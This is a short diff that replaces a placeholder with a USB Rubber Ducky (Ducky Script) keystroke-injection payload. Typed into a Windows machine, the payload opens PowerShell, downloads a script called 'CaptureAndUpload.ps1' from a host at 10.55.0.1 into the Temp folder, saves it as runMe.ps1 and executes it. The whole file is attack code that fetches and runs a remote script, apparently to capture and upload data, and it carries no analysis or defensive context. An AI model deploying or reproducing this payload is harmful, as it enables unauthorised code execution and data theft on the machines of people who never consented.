@@ -1,1 +1,18 @@
-Place marker
+GUI r
+STRING powershell 
+ENTER
+DELAY 200
+STRING cd
+SPACE
+STRING \Temp
+ENTER
+STRING curl
+SPACE
+STRING "http://10.55.0.1/Scripts/CaptureAndUpload.ps1"
+SPACE
+STRING -o
+SPACE
+STRING ".\runMe.ps1"
+ENTER
+STRING ./runMe.ps1
+ENTER
